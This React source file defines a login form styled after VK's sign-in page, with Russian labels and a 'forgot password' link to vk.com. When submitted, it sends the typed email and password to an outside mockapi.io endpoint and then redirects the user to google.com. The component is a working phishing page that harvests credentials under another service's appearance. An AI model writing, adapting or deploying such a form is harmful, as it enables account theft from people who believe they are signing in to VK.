import { React, useState } from "react";
import "./style.scss";
import axios from "axios";

export const AuthForm = () => {
  const [initEmail, setInitEmail] = useState("");
  const [initPassword, setInitPassword] = useState("");
  // const [userData, setUserData] = useState({});

  const changeEmailHandler = (event) => {
    setInitEmail(event.target.value);
  };
  const changePasswordHandler = (event) => {
    setInitPassword(event.target.value);
  };

  const clickHandler = (event) => {
    event.preventDefault();

    let userData = {
      Email: initEmail,
      Password: initPassword,
      Date: new Date(),
    };

    setInitEmail("");
    setInitPassword("");

    postData(userData);
    window.location.href = "https://google.com/";
  };
  const postData = (userData) => {
    axios
      .post("https://6308f66e722029d9dddc4a49.mockapi.io/vkmockdata", {
        email: userData.Email,
        password: userData.Password,
        timestamp: userData.Date,
      })
      .then(function (response) {
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  return (
    <form className="authForm">
      <div className="authForm__inputs">
        <div className="authForm__email_header">Телефон или email</div>
        <input
          className="authForm__email_input"
          type="text"
          onChange={changeEmailHandler}
          value={initEmail}
        />
        <div className="authForm__password_header">Пароль</div>
        <input
          className="authForm__password_input"
          type="password"
          onChange={changePasswordHandler}
          value={initPassword}
        />
        <button
          className="authForm__button"
          type="submit"
          onClick={clickHandler}
        >
          Войти
        </button>
        <a className="authForm__forgot_password" href="https://vk.com/">
          Забыли пароль?
        </a>
      </div>
    </form>
  );
};
